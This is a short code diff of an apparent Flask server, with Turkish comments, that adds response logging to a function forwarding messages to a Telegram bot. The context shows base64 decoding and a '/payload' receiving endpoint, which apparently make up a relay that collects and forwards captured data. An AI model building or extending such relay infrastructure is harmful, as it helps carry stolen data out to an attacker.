@@ -22,14 +22,22 @@ def safe_decode(b64_str):
         except:
             return "Decode Hatası"
 
+# BU KISIM ESKİSİNİN YERİNE GELECEK
 def send_to_telegram(message):
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
         data = {"chat_id": TELEGRAM_CHAT_ID, "text": message[:4000], "parse_mode": "HTML"}
-        requests.post(url, json=data, timeout=10)
+        
+        # Yanıtı yakalıyoruz ki Render loglarında görebilelim
+        response = requests.post(url, json=data, timeout=15)
+        
+        # RENDER LOGLARINDA BU ÇIKTIYI KONTROL ET
+        print(f"--- TELEGRAM DURUMU ---")
+        print(f"Durum Kodu: {response.status_code}")
+        print(f"Yanıt Metni: {response.text}")
+        
     except Exception as e:
-        print(f"Hata: {e}")
-
+        print(f"Ciddi Hata: {e}")
 # ====================== PAYLOAD ENDPOINT ======================
 @app.route('/payload', methods=['GET'])
 def payload_receiver():
